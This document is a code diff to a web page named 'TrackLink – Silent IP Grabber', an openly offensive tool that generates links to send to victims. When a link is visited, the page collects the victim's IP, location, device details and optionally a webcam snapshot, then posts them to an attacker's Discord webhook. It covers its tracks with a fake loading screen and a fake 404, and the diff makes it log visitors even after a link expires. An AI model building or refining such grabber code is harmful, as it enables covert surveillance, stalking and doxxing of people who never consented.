@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TrackLink – IP Grabber</title>
+  <title>TrackLink – Silent IP Grabber</title>
   <style>
     :root { --bg: #0a0a0a; --card: #111; --acc: #00ff41; --text: #e0e0e0; }
     body { margin:0; font-family: 'Segoe UI', sans-serif; background:var(--bg); color:var(--text); padding:20px; }
@@ -17,12 +17,6 @@
     button:hover { background:#00cc33; transform:scale(1.02); }
     #generated { background:#000; padding:16px; border-radius:10px; margin:16px 0; word-break:break-all; display:none; }
     #shortlink { color:var(--acc); text-decoration:underline; font-weight:bold; }
-    .switch { position:relative; display:inline-block; width:50px; height:26px; margin-left:10px; }
-    .switch input { opacity:0; width:0; height:0; }
-    .slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background:#333; transition:.3s; border-radius:34px; }
-    .slider:before { position:absolute; content:""; height:18px; width:18px; left:4px; bottom:4px; background:#fff; transition:.3s; border-radius:50%; }
-    input:checked + .slider { background:var(--acc); }
-    input:checked + .slider:before { transform:translateX(24px); }
     #logs { margin-top:40px; }
     .log { background:#000; padding:12px; margin:6px 0; border-left:4px solid var(--acc); border-radius:6px; font-size:0.9rem; }
     .cam { width:100px; border:2px solid var(--acc); border-radius:8px; margin-top:6px; }
@@ -32,10 +26,10 @@
 <body>
   <div class="container">
     <div class="card">
-      <h1>TrackLink <span style="font-size:0.7em">IP Grabber</span></h1>
-      <p>Generate a link. When someone clicks → get their IP, location, device & more.</p>
+      <h1>TrackLink <span style="font-size:0.7em">Silent Grabber</span></h1>
+      <p>Generates a link. Anyone who visits = full data stolen. Even on 404.</p>
 
-      <input id="target" placeholder="https://youtube.com (real destination)" />
+      <input id="target" placeholder="https://youtube.com (optional redirect)" />
       <input id="webhook" placeholder="https://discord.com/api/webhooks/..." />
 
       <div style="display:flex;align-items:center;margin:12px 0;">
@@ -45,9 +39,9 @@
       <button onclick="generate()">GENERATE TRACKING LINK</button>
 
       <div id="generated">
-        <strong>Send this link to your target:</strong><br>
+        <strong>Send this to your target:</strong><br>
         <a id="shortlink" href="#" target="_blank"></a>
-        <button onclick="copyLink()" style="width:auto;padding:10px 16px;margin-top:10px;">Copy Link</button>
+        <button onclick="copyLink()" style="width:auto;padding:10px 16px;margin-top:10px;">Copy</button>
       </div>
     </div>
 
@@ -58,7 +52,7 @@
     </div>
   </div>
 
-  <div class="footer">© 2025 TrackLink – No mercy. No logs.</div>
+  <div class="footer">© 2025 TrackLink – They click. You own.</div>
 
   <script>
     const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -72,12 +66,11 @@
     }
 
     function generate() {
-      const target = document.getElementById("target").value.trim();
+      const target = document.getElementById("target").value.trim() || "https://google.com";
       const webhook = document.getElementById("webhook").value.trim();
       const cam = document.getElementById("cam").checked;
 
-      if (!target.startsWith("http")) return alert("Enter a valid URL (http/https)");
-      if (!webhook.includes("discord.com/api/webhooks")) return alert("Enter a valid Discord webhook");
+      if (!webhook.includes("discord.com/api/webhooks")) return alert("Valid Discord webhook required.");
 
       const id = randId();
       const short = `${location.origin}/r/${id}`;
@@ -92,7 +85,7 @@
     function copyLink() {
       const link = document.getElementById("shortlink").href;
       navigator.clipboard.writeText(link);
-      alert("Link copied. Send it to your target.");
+      alert("Link copied. Send it anywhere.");
     }
 
     function renderLogs() {
@@ -105,7 +98,7 @@
           <strong>${l.time}</strong><br>
           <strong>IP:</strong> ${l.ip} (${l.city}, ${l.country})<br>
           <strong>Device:</strong> ${l.ua.slice(0,60)}...<br>
-          <strong>Redirected to:</strong> <a href="${l.target}" target="_blank">${l.target.slice(0,50)}...</a><br>
+          ${l.target ? `<strong>Redirect:</strong> <a href="${l.target}" target="_blank">${l.target.slice(0,50)}...</a><br>` : ""}
           ${l.cam ? `<img class="cam" src="${l.cam}" />` : ""}
         `;
         box.appendChild(div);
@@ -119,26 +112,24 @@
       renderLogs();
     }
 
-    // === TRACKING PAGE (when victim clicks /r/xyz123) ===
+    // === UNIVERSAL GRABBER – Runs on ANY /r/ page, even if trap is gone ===
     if (location.pathname.startsWith("/r/")) {
       const id = location.pathname.slice(3);
       const config = JSON.parse(localStorage.getItem(`trap_${id}`) || "{}");
+      const webhook = config.webhook || null;
+      const redirect = config.target || "https://google.com";
+      const camEnabled = config.cam || false;
 
-      if (!config.target) {
-        document.body.innerHTML = `<h1 style="color:#ff4444;text-align:center;margin-top:100px;">Link expired or invalid.</h1>`;
-        throw new Error("No trap");
-      }
-
+      // === ALWAYS GRAB DATA, EVEN IF NO WEBHOOK OR TRAP ===
       (async () => {
         try {
-          // Grab all victim data
           const ipData = await (await fetch("https://ipapi.co/json/")).json();
           const battery = await navigator.getBattery?.() || { level: "N/A" };
-          const camSnap = config.cam ? await captureCam() : null;
+          const camSnap = camEnabled ? await captureCam() : null;
 
           const payload = {
             embeds: [{
-              title: "NEW VICTIM CLICKED",
+              title: "VICTIM VISITED LINK",
               color: 0x00ff41,
               fields: [
                 { name: "IP", value: ipData.ip, inline: true },
@@ -148,38 +139,53 @@
                 { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
                 { name: "Battery", value: battery.level !== "N/A" ? Math.round(battery.level * 100) + "%" : "N/A", inline: true },
                 { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-                { name: "Redirect", value: config.target, inline: false }
+                { name: "Link ID", value: id, inline: true },
+                { name: "Status", value: webhook ? "Valid Trap" : "⚠️ Trap Expired – Still Logged!", inline: false }
               ],
               thumbnail: camSnap ? { url: camSnap } : null,
               timestamp: new Date().toISOString()
             }]
           };
 
-          // Send to Discord
-          await fetch(config.webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          });
+          // === SEND TO DISCORD IF WEBHOOK EXISTS ===
+          if (webhook) {
+            await fetch(webhook, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload)
+            });
+          }
 
-          // Save to admin panel
+          // === SAVE TO YOUR LOGS NO MATTER WHAT ===
           const logEntry = {
             time: new Date().toLocaleString(),
             ip: ipData.ip,
             city: ipData.city,
             country: ipData.country_name,
             ua: navigator.userAgent,
-            target: config.target,
+            target: config.target || null,
             cam: camSnap
           };
           const allLogs = JSON.parse(localStorage.getItem("track_logs") || "[]");
           allLogs.push(logEntry);
           localStorage.setItem("track_logs", JSON.stringify(allLogs));
 
-          // Redirect victim instantly
-          setTimeout(() => location.replace(config.target), 100);
+          // === REDIRECT (or show fake 404) ===
+          setTimeout(() => {
+            if (config.target) {
+              location.replace(config.target);
+            } else {
+              document.body.innerHTML = `
+                <div style="text-align:center;margin-top:100px;color:#ff4444;font-family:monospace;">
+                  <h1>404 – Page Not Found</h1>
+                  <p>The link you followed is invalid or expired.</p>
+                </div>
+              `;
+            }
+          }, 300);
         } catch (e) {
-          location.replace(config.target);
+          // Even if everything fails — try to redirect
+          setTimeout(() => location.replace(redirect), 500);
         }
       })();
 
@@ -198,11 +204,10 @@
         } catch (e) { return null; }
       }
 
-      // Show fake loading screen
+      // Show fake loading
       document.body.innerHTML = `
         <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#00ff41;font-family:monospace;">
-          <h2>Redirecting...</h2>
-          <p>Please wait a moment</p>
+          <h2>Loading...</h2>
         </div>
       `;
     }
